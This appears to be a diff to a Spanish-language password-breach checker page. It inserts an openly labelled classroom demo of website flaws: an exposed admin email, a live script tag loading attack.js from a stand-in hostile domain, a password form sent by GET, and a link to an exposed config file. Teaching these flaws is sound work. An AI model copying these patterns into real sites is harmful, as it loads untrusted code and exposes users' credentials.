@@ -94,7 +94,32 @@
 </head>
 <body>
   <div class="top-bar"></div>
+ <h1>🛑 Portal Inseguro — Ejemplo para la Clase</h1>
+  <p>Este portal contiene fallas deliberadas para demostrar riesgos de seguridad en sitios web estáticos.</p>
 
+  <h2>1. Fuga de información</h2>
+  <p>Correo del administrador: <strong>admin@institucion.gob.bo</strong></p>
+
+  <h2>2. Script inseguro</h2>
+  <p>Este sitio carga un script externo NO confiable:</p>
+  <code>&lt;script src="http://example-malo.com/attack.js"&gt;&lt;/script&gt;</code>
+
+  <script src="http://example-malo.com/attack.js"></script>
+
+  <h2>3. Formulario sin validación</h2>
+  <form action="#" method="GET">
+    <label>Nombre completo:</label><br>
+    <input type="text" name="nombre" placeholder="Escribe tu nombre"><br><br>
+
+    <label>Contraseña:</label><br>
+    <input type="password" name="pass" placeholder="12345"><br><br>
+
+    <button type="submit">Enviar (No seguro)</button>
+  </form>
+
+  <h2>4. Archivo sensible expuesto</h2>
+  <p>Puedes ver este archivo directamente desde la URL:</p>
+  <a href="config.txt" target="_blank">config.txt (expuesto)</a>
   <div class="container">
     <h1>Escribe una contraseña en esta caja</h1>
     <h2 class="subtitulo">y descubre si ha sido comprometida</h2>
@@ -199,4 +224,5 @@
 </script>
 </body>
 </html>
+
 
